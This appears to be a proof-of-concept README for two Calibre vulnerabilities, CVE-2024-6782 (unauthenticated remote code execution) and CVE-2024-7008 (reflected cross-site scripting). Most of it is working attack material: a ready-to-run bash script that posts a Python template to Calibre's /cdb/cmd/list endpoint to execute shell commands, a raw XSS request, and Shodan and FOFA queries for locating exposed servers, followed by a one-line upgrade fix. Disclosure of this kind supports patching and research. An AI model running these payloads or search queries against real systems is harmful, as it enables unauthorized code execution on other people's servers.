### Description 
- CVE-2024-6782 = Improper access control in Calibre 6.9.0 ~ 7.14.0 allow unauthenticated attackers to achieve remote code execution.
- CVE-2024-7008 = Unsanitized user-input in Calibre <= 7.15.0 allow attackers to perform reflected cross-site scripting.

### Proof of concept (CVE-2024-6782)

![8d4237fcfec48246cfa4fb6fe3e48327_CVE-2024-6782_01 calibre-rce](https://github.com/user-attachments/assets/8c514ee0-e072-4d93-bc23-f1c132a39b43)

- save (exploit.sh) and run it > bash exploit.sh
```bash
#!/bin/bash

curl -X POST http://TARGET_IP:8080/cdb/cmd/list \
     -H "Content-Type: application/json" \
     -d '[
           ["template"],
           "",
           "",
           "",
           1,
           "python:def evaluate(a, b):\n import subprocess\n try:\n return subprocess.check_output(['cmd.exe', '/c', '\''whoami'\'']).decode()\n except Exception:\n return subprocess.check_output(['sh', '\''-c'\'', '\''whoami'\'']).decode()"
         ]'
```

### Proof of concept (CVE 2024-7008)
```bash
GET /browse/book/TEST&quot;;window.stop();alert(document.domain);%2f%2f HTTP/1.1
Host: {{Hostname}}
```

### Query of concept
```bash
shodan-query: html:"Calibre"
fofa-query: "Server: calibre"
```

### How to fix ?
Upgrade Debian:unstable calibre to version 7.16.0+ds-1 or higher.
